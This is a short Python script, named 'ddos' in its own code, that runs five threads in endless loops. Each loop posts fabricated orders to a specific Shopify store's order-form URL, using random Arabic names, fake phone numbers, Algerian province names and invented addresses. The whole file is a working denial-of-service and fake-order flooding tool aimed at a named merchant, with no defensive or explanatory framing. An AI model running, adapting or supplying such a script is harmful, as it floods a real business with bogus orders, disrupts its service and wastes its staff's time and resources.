import random
import requests
import threading
list_name = ['Amal', 'Amani', 'Amira', 'Arwa', 'Aya', 'Basma', 'Bayan', 'Bushra', 'Dalal', 'Dalia', 'Dalila', 'Dana', 'Dania', 'Dareen', 'Dina', 'Duaa', 'Farida', 'Fairouz', 'Farah', 'Habiba', 'Hala', 'Halima', 'Hanifa', 'Hawa', 'Heba', 'Ibtisam', 'Iman', 'Jude', 'Jumanah', 'Karima', 'Khadija', 'Khalida', 'Khawla', 'Lana', 'Lara', 'Latifa', 'Leen', 'Lina', 'Loulia', 'Maha', 'Malak', 'Malika', 'Marwa', 'Marya', 'Maya', 'Maysoon', 'Mona', 'Munira', 'Munya', 'Nabila', 'Nadia', 'Nadine', 'Nada', 'Nahla',
             'Naila', 'Naima', 'Najat', 'Nasira', 'Nesrine', 'Nawal', 'Neziha', 'Nihal', 'Nour', 'Nuha', 'Nura', 'Oma', 'Qamar', 'Qadira', 'Qistina', 'Rabia', 'Rahima', 'Rania', 'Rashida', 'Reem', 'Rihanna', 'Ruqayya', 'Sabah', 'Safiyah', 'Sahar', 'Saida', 'Salma', 'Sajida', 'Sakina', 'Salma', 'Samar', 'Samira', 'Sarah', 'Shahd', 'Shakira', 'Shams', 'Sherine', 'Sumayya', 'Tahira', 'Taj', 'Tala', 'Tamara', 'Tara', 'Tamanna', 'Tasnim', 'Umm Kulthoum', 'Wafaa', 'Yara', 'Yasmin', 'Yumna', 'Yusra', 'Zayn', 'Zaynab', 'Zeina']
wilaya = ['drar', 'hlef', 'aghouat', 'um El Bouaghi', 'atna', 'éjaïa', 'iskra', 'échar', 'lida', 'Bouira', 'Tamanrasset', 'Tébessa', 'Tlemcen', 'Tiaret', 'Tizi Ouzou', 'Alger', 'Djelfa', 'Jijel', 'Sétif', 'Saïda', 'Skikda', 'Sidi Bel Abbès', 'Annaba', 'Guelma', 'Constantine',
          'Médéa', 'Mostaganem', "M'Sila", 'Mascara', 'Ouargla', 'Oran', 'El Bayadh', 'Illizi', 'Bordj Bou Arreridj', 'Boumerdès', 'El Tarf', 'Tindouf', 'Tissemsilt', 'El Oued', 'Khenchela', 'Souk Ahras', 'Tipaza', 'Mila', 'Aïn Defla', 'Naâma', 'Aïn Témouchent', 'Ghardaïa', 'Relizane']
shipping = ['cite militaire', 'rue national', 'cite lot', 'en facce de la mosque',
            'a cote de la baladiya', 'en facce du comesariat', 'la placete']
shipping_2 = ['appartemnt', 'villa']

i=0
def ddos():
    global i
    while(1):
        i+=1
        location = f'{random.choice(shipping)} {random.choice(shipping_2)} {random.randint(1,100)}'
        number = str(f'{0}{random.randint(555555555,777777777)}')
        fname = random.choice(list_name)
        lname = random.choice(list_name)
        rwilaya = random.choice(wilaya)
        print(f"{i}-",location, number, fname, lname, rwilaya)
        data = {'variant_id': 0, 'qty': 1, 'firstname': fname, 'lastname': lname, 'phone': number,
                'chippingaddress1': location, 'chippingcity': rwilaya, 'region': '', 'note': 0}
        url = "https://form.braquets.dev/orders/luxiskin/rosebaiedz.myshopify.com/7517281353979"
        response = requests.post(url, data)
        print(response.status_code)


t1 = threading.Thread(target=ddos)
t1.start()
t2 = threading.Thread(target=ddos)
t2.start()
t3 = threading.Thread(target=ddos)
t3.start()
t4 = threading.Thread(target=ddos)
t4.start()
t5 = threading.Thread(target=ddos)
t5.start()
